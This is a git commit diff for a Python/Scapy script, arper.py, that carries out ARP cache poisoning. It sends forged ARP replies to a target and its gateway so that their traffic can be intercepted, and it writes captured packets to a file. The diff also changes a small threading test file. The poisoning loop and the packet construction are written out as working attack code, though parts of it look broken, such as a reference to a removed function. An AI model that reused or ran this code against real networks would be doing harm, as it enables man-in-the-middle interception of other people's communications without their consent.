bdb51e9145f259b6ff9867f4ffcc68a0f8472208
wujiaming123 <lipingwujiaming@yahoo.com>
2017-04-04 22:37:19 +0800

    ss

--- arper.py
+++ arper.py
@@ -2,8 +2,6 @@ from scapy.all import *
 import sys
 import getopt
 import threading
-import os
-import signal
 
 opts,args=getopt.getopt(sys.argv[1:],'a',['append','target=','gateway=','interface=','help'])
 target_ip='0.0.0.0'
@@ -42,41 +40,11 @@ def main():
     writer.flush()
     writer.close()
     poison_thread.stop()
-    poison_thread.join()
-
 
 def getMac(ip):
     ans,unans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=2,retry=10)
     for s,r in ans:
         return r[Ether].src
-'''
-def poison(gateway_ip,gateway_mac,target_ip,target_mac):
-    poison_target=ARP()
-    poison_target.op=2
-    poison_target.psrc=gateway_ip
-    poison_target.pdst=target_ip
-    poison_target.hwdst=target_mac
-
-    poison_gateway=ARP()
-    poison_gateway.op=2
-    poison_gateway.psrc=target_ip
-    poison_gateway.pdst=gateway_ip
-    poison_gateway.hwdst=gateway_mac
-
-    print "sending packets..."
-
-    while True:
-        try:
-            send(poison_gateway)
-            send(poison_target)
-            time.sleep(2)
-            print 'send again'
-
-        except KeyboardInterrupt:
-            break
-    print "stop arp"
-    return
-'''
 
 class Poison_Thread(threading.Thread):
     global target_ip,target_mac,gateway_ip,gateway_mac
@@ -96,22 +64,14 @@ class Poison_Thread(threading.Thread):
             poison_gateway.pdst=gateway_ip
             poison_gateway.hwdst=gateway_mac
             print "sending packets..."
-            while True:
-                try:
-                    send(poison_gateway)
-                    send(poison_target)
-                    time.sleep(2)
-                    print 'send again'
-                except KeyboardInterrupt:
-                    pass
-            print "stop arp"
-            return
+            while not self.stopped:
+                send(poison_gateway)
+                send(poison_target)
+                time.sleep(2)
+                print 'send again'
         sub=threading.Thread(target=poison,args=(gateway_ip,gateway_mac,target_ip,target_mac))
         sub.setDaemon(True)
         sub.start()
-
-        while not self.stopped:
-            sub.join(1)
     def stop(self):
         self.stopped=True
 
--- test.py
+++ test.py
@@ -1,17 +1,32 @@
 import threading
+import time
 
-class Poison_Thread(threading.thread):
-    def __init__(self):
+class Poison_Thread(threading.Thread):
+    def __init__(self,num):
         super(Poison_Thread,self).__init__()
         self.stopped=False
+        self.num=num
     def run(self):
         def poison():
-            pass
+            while not self.stopped:
+                print self.num
         sub=threading.Thread(target=poison,args=())
         sub.setDaemon(True)
         sub.start()
+        '''
 
         while not self.stopped:
             sub.join(1)
+        '''
     def stop(self):
         self.stopped=True
+
+
+if __name__=="__main__":
+    pt1=Poison_Thread(1)
+    pt2=Poison_Thread(2)
+    pt1.start()
+    pt2.start()
+    time.sleep(0.5)
+    pt1.stop()
+    pt2.stop()
